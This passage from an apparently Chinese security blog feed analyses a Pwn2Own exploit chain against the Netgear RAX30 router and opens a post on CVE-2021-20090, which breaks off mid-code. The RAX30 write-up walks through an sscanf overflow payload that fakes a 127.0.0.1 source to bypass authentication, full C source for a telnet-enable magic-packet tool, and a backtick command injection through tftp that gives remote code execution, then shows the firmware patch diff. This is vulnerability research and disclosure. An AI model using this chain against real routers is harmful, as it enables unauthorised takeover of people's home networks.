<span class="keyword">if</span> ( v5 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      error = SSL_get_error(*(_DWORD *)(a1 + <span class="number">4</span>), <span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( error - <span class="number">2</span> &gt; <span class="number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        v8 = error &gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( error != <span class="number">1</span> )</span><br><span class="line">          v8 = error - <span class="number">5</span> &gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v8 )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    buf[i++] = v9;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( v9 != <span class="number">10</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>所以就可以从https端口打进去来配合sscanf达到溢出</p><p>SOAP运行命令的时候需要认证</p><p>认证函数如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">sub_A2C0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v19, <span class="number">0</span>, <span class="number">18</span>);</span><br><span class="line">  v2 = dword_4AB74;</span><br><span class="line">  <span class="keyword">if</span> ( !cmsUtl_strcmp(a1, <span class="string">"127.0.0.1"</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  LanInfo = cmsNet_getLanInfo();</span><br><span class="line">  <span class="keyword">if</span> ( LanInfo )</span><br><span class="line">  {</span><br><span class="line">    log_log(<span class="number">3</span>, <span class="string">"CheckAuthenticated"</span>, <span class="number">207</span>, <span class="string">"Fail to get %s's IP address, ret=%d"</span>, <span class="string">"br0"</span>, LanInfo);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  }</span><br><span class="line">  v4 = inet_ntoa(in);</span><br><span class="line">  log_log(<span class="number">7</span>, <span class="string">"CheckAuthenticated"</span>, <span class="number">198</span>, <span class="string">"%s's IP address = %s"</span>, <span class="string">"br0"</span>, v4);</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>服务器在验证用户身份时首先检查请求是否来自127.0.0.1，如果是127.0.0.1则不需要身份验证</p><p>发现这个a1是可以通过上面的那个溢出达成覆盖，所以可以将a1覆盖成127.0.0.1来达到身份验证绕过</p><p>包如下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = POST + SPACE + (<span class="string">"a"</span> * [REDACTED]) + SPACE + (<span class="string">"b"</span> * [REDACTED]) + <span class="string">"127.0.0.1"</span> + (<span class="string">"c"</span> * [REDACTED])</span><br></pre></td></tr></tbody></table></figure><p>同时，这个路由器还存在重置管理员密码的漏洞</p><p>设置路由器时，用户需要输入一个新的的密码，并给这个密码加上安全问题和答案，这些问题的答案以纯文本 (base64) 形式存储在设备配置中</p><p>利用前面的漏洞就可以获取配置，从而进行密码重置</p><p>发现了可以发送magic数据来达到telnet开启，magic发包代码如下，需要设备的MAC地址、用户名、密码，这些都可以利用之前的漏洞来得到</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This program is a re-implementation of the telnet console enabler utility</span></span><br><span class="line"><span class="comment">  for use with Netgear wireless routers.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  The original Netgear Windows binary version of this tool is available here:</span></span><br><span class="line"><span class="comment">  &lt;http://www.netgear.co.kr/Support/Product/FileInfo.asp?IDXNo=155&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Per DMCA 17 U.S.C. §1201(f)(1)-(2), the original Netgear executable was</span></span><br><span class="line"><span class="comment">  reverse engineered to enable interoperability with other operating systems</span></span><br><span class="line"><span class="comment">  not supported by the original windows-only tool (MacOS, Linux, etc).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Netgear Router - Console Telnet Enable Utility</span></span><br><span class="line"><span class="comment">        Release 0.1 : 25th June 2006</span></span><br><span class="line"><span class="comment">        Copyright (C) 2006, yoshac @ member.fsf.org</span></span><br><span class="line"><span class="comment">        Release 0.2 : 20th August 2012</span></span><br><span class="line"><span class="comment">        dj bug fix on OS X</span></span><br><span class="line"><span class="comment">        Release 0.3 : 8th October 2012</span></span><br><span class="line"><span class="comment">        keithr-git bug fix to send entire packet in one write() call,</span></span><br><span class="line"><span class="comment">          strcpy-&gt;strncpy, clean up some whitespace</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment">        it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment">        the Free Software Foundation; either version 2 of the License, or</span></span><br><span class="line"><span class="comment">        (at your option) any later version.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment">        but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment">        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment">        GNU General Public License for more details.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        You should have received a copy of the GNU General Public License along</span></span><br><span class="line"><span class="comment">        with this program; if not, write to the Free Software Foundation, Inc.,</span></span><br><span class="line"><span class="comment">        51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  The RSA MD5 and Blowfish implementations are provided under LGPL from</span></span><br><span class="line"><span class="comment">  &lt;http://www.opentom.org/Mkttimage&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netdb.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;process.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"md5.h"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"blowfish.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> output_buf[<span class="number">0x640</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> BLOWFISH_CTX ctx;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PAYLOAD</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">char</span> signature[<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> mac[<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> username[<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> password[<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> reserved[<span class="number">0x40</span>];</span><br><span class="line">} payload;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">(<span class="type">char</span> * progname)</span></span><br><span class="line">{</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\\nVersion:0.3, 2012/10/08\\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Usage:\\n%s &lt;host ip&gt; &lt;host mac&gt; &lt;user name&gt; &lt;password&gt;\\n\\n"</span>,progname);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">socket_connect</span><span class="params">(<span class="type">char</span> *host, <span class="type">in_port_t</span> port)</span>{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">hp</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">  <span class="type">int</span> on = <span class="number">1</span>, sock;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((hp = gethostbyname(host)) == <span class="literal">NULL</span>){</span><br><span class="line">    herror(<span class="string">"gethostbyname"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  bcopy(hp-&gt;h_addr, &amp;addr.sin_addr, hp-&gt;h_length);</span><br><span class="line">  addr.sin_port = htons(port);</span><br><span class="line">  addr.sin_family = AF_INET;</span><br><span class="line">  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">  setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (<span class="type">const</span> <span class="type">char</span> *)&amp;on, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">  <span class="keyword">if</span>(sock == <span class="number">-1</span>){</span><br><span class="line">    perror(<span class="string">"setsockopt"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span>(connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in)) == <span class="number">-1</span>){</span><br><span class="line">    perror(<span class="string">"connect"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> sock;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">GetOutputLength</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> lInputLong)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> lVal = lInputLong % <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lVal!=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> lInputLong+<span class="number">8</span>-lVal;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> lInputLong;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">EncodeString</span><span class="params">(BLOWFISH_CTX *ctx,<span class="type">char</span> *pInput,<span class="type">char</span> *pOutput, <span class="type">int</span> lSize)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> SameDest = <span class="number">0</span>;</span><br><span class="line">  <span class="type">int</span> lCount;</span><br><span class="line">  <span class="type">int</span> lOutSize;</span><br><span class="line">  <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  lOutSize = GetOutputLength(lSize);</span><br><span class="line">  lCount=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (lCount&lt;lOutSize)</span><br><span class="line">    {</span><br><span class="line">      <span class="type">char</span> *pi=pInput;</span><br><span class="line">      <span class="type">char</span> *po=pOutput;</span><br><span class="line">      <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)</span><br><span class="line">        *po++=*pi++;</span><br><span class="line">      Blowfish_Encrypt(ctx,(<span class="type">uint32_t</span> *)pOutput,(<span class="type">uint32_t</span> *)(pOutput+<span class="number">4</span>));</span><br><span class="line">      pInput+=<span class="number">8</span>;</span><br><span class="line">      pOutput+=<span class="number">8</span>;</span><br><span class="line">      lCount+=<span class="number">8</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> lCount;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fill_payload</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * input[])</span></span><br><span class="line">{</span><br><span class="line">  MD5_CTX MD;</span><br><span class="line">  <span class="type">char</span> MD5_key[<span class="number">0x10</span>];</span><br><span class="line">  <span class="type">char</span> secret_key[<span class="number">0x400</span>]=<span class="string">"AMBIT_TELNET_ENABLE+"</span>;</span><br><span class="line">  <span class="type">int</span> encoded_len;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;payload, <span class="number">0</span>, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> struct has .mac behind .signature and is filled here</span></span><br><span class="line">  <span class="built_in">strcpy</span>(payload.mac, input[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(payload.username, input[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc==<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">strcpy</span>(payload.password, input[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">  MD5Init(&amp;MD);</span><br><span class="line">  MD5Update(&amp;MD,payload.mac,<span class="number">0x70</span>);</span><br><span class="line">  MD5Final(MD5_key,&amp;MD);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strncpy</span>(payload.signature, MD5_key, <span class="keyword">sizeof</span>(payload.signature));</span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> so why concatenate outside of the .signature boundary again</span></span><br><span class="line">  <span class="comment">//       using strcat? deleting this line would keep the payload the same and not</span></span><br><span class="line">  <span class="comment">//       cause some funky abort() or segmentation fault on newer gcc's</span></span><br><span class="line">  <span class="comment">// dj: this was attempting to put back the first byte of the MAC address</span></span><br><span class="line">  <span class="comment">// dj: which was getting stomped by the strcpy of the MD5_key above</span></span><br><span class="line">  <span class="comment">// dj: a better fix is to use strncpy to avoid the stomping in the 1st place</span></span><br><span class="line">  <span class="comment">//  strcat(payload.signature, input[2]);</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc==<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">strncat</span>(secret_key,input[<span class="number">4</span>],<span class="keyword">sizeof</span>(secret_key) - <span class="built_in">strlen</span>(secret_key) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  Blowfish_Init(&amp;ctx,secret_key,<span class="built_in">strlen</span>(secret_key));</span><br><span class="line"></span><br><span class="line">  encoded_len = EncodeString(&amp;ctx,(<span class="type">char</span>*)&amp;payload,(<span class="type">char</span>*)&amp;output_buf,<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> encoded_len;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> PORT = <span class="number">23</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> * argv[])</span></span><br><span class="line">{</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> datasize;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc!=<span class="number">5</span>)</span><br><span class="line">    usage(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  datasize = fill_payload(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> sock = socket_connect(argv[<span class="number">1</span>],PORT);</span><br><span class="line">  write(sock, output_buf, datasize);</span><br><span class="line">  close(sock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>但发现telnet连接上去之后是一个受限的cli，有很多时候受限的cli里存在命令注入漏洞，看一下libcms_cli.so是否存在命令注入漏洞</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_5CC0</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v2[<span class="number">520</span>]; <span class="comment">// [sp+0h] [bp-208h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(v2, <span class="string">"bcmbusybox tftp %s"</span>, a1);</span><br><span class="line">  <span class="keyword">return</span> prctl_runCommandInShellBlocking(v2);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现在sub_5CC0里用tftp命令时存在命令注入，所以可以利用如下方式进行利用</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp `<span class="built_in">ls</span>`</span><br></pre></td></tr></tbody></table></figure><p>最后达到rce效果</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>下载fixed版本<a href="https://www.downloads.netgear.com/files/GDC/RAX30/RAX30-V1.0.10.94_3.zip">1.0.10.94</a>，首先diff一下soap_serverd，可以看到在切割method这些数据的时候加上了%511</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( _isoc99_sscanf(v18, <span class="string">"%511[^ ] %511[^ ] %511[^ ]"</span>, v15, v16, v17) != 3 )</span><br></pre></td></tr></tbody></table></figure><p>在https输入数据的时候也进行了限制，加入了v6 &lt;= v7这个长度判断</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_83AC</span><span class="params">(<span class="type">int</span> a1, <span class="type">void</span> *s, <span class="type">size_t</span> a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v6; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> error; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">bool</span> v11; <span class="comment">// cc</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">void</span> *v13; <span class="comment">// [sp+4h] [bp-1Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v13 = s;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, a3);</span><br><span class="line">  v6 = a3 - <span class="number">1</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( v6 &lt;= v7 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      v8 = SSL_read(*(_DWORD *)(a1 + <span class="number">4</span>), &amp;v13, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v8 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      error = SSL_get_error(*(_DWORD *)(a1 + <span class="number">4</span>));</span><br><span class="line">      <span class="keyword">if</span> ( error - <span class="number">2</span> &gt; <span class="number">1</span> )</span><br><span class="line">      {</span><br><span class="line">        v11 = error &gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( error != <span class="number">1</span> )</span><br><span class="line">          v11 = error - <span class="number">5</span> &gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v11 )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    v12 = (<span class="type">unsigned</span> __int8)v13 == <span class="number">10</span>;</span><br><span class="line">    *((_BYTE *)s + v7++) = (_BYTE)v13;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( !v12 );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;Pwn2Own-RAX30-Routers漏洞分析&quot;&gt;&lt;a href=&quot;#Pwn2Own-RAX30-Routers漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;Pwn2Own-RAX30 Rou</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://www.z1r0.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="IOT" scheme="https://www.z1r0.top/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-20090 ASUS身份验证绕过</title>
    <link href="https://www.z1r0.top/2023/09/06/CVE-2021-20090-ASUS%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/"/>
    <id>https://www.z1r0.top/2023/09/06/CVE-2021-20090-ASUS%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87/</id>
    <published>2023-09-06T07:17:11.000Z</published>
    <updated>2023-09-06T07:18:15.196Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="CVE-2021-20090-ASUS身份验证绕过"><a href="#CVE-2021-20090-ASUS身份验证绕过" class="headerlink" title="CVE-2021-20090 ASUS身份验证绕过"></a><strong>CVE-2021-20090 ASUS身份验证绕过</strong></h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>A path traversal vulnerability in the web interfaces of Buffalo WSR-2533DHPL2 firmware version &lt;= 1.02 and WSR-2533DHP3 firmware version &lt;= 1.24 could allow unauthenticated remote attackers to bypass authentication.</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>固件下载链接：<a href="https://dlcdnets.asus.com/pub/ASUS/wireless/DSL-AC88U/FW_DSL_AC88U_11005502.zip?model=DSL-AC88U">https://dlcdnets.asus.com/pub/ASUS/wireless/DSL-AC88U/FW_DSL_AC88U_11005502.zip?model=DSL-AC88U</a></p><p>下载之后可以binwalk解开，解开后可以找到httpd文件</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">{</span><br><span class="line">  .......</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        {</span><br><span class="line">          pthread_attr_init(&amp;attr);</span><br><span class="line">          pthread_attr_setstacksize(&amp;attr, 0x4650u);</span><br><span class="line">          pthread_attr_setdetachstate(&amp;attr, <span class="number">1</span>);</span><br><span class="line">          matched = pthread_create((*(dword_614FC + <span class="number">4</span> * v9) + <span class="number">32</span>), <span class="number">0</span>, sub_D6E8, (*(dword_614FC + <span class="number">4</span> 